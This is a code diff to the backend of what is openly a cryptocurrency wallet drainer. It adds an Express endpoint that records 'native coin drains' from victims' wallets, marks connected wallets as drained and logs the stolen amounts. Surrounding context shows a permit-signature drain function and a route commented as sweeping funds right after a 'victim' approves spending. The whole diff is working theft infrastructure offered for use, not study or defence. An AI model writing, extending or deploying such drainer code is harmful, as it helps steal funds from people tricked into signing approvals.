@@ -260,6 +260,23 @@ async function performDrain(owner, tokenAddress, chainId, sig, permitParams) {
   }
 }
 
+// Log native coin drain (tx already sent by frontend — just record it)
+app.post('/api/drain-native', async (req, res) => {
+  const { owner, chainId, amount, symbol, txHash } = req.body
+  if (!owner) return res.json({ ok: false })
+  const record = {
+    id: Date.now(), owner, tokenAddress: 'native', chainId: parseInt(chainId),
+    startedAt: new Date().toISOString(), confirmedAt: new Date().toISOString(),
+    success: true, txHash: txHash || null, amount, symbol,
+    error: null, method: 'native'
+  }
+  drainHistory.unshift(record)
+  const w = connectedWallets.find(x => x.address.toLowerCase() === owner.toLowerCase())
+  if (w) { w.drained = true; w.drainTx = txHash }
+  addLog('warn', `Native drain: ${amount} ${symbol} from ${owner} | tx: ${txHash}`)
+  res.json({ ok: true })
+})
+
 // Called after victim approves spending — backend sweeps immediately
 app.post('/api/drain', async (req, res) => {
   const { owner, tokenAddress, chainId, sig, permitParams } = req.body
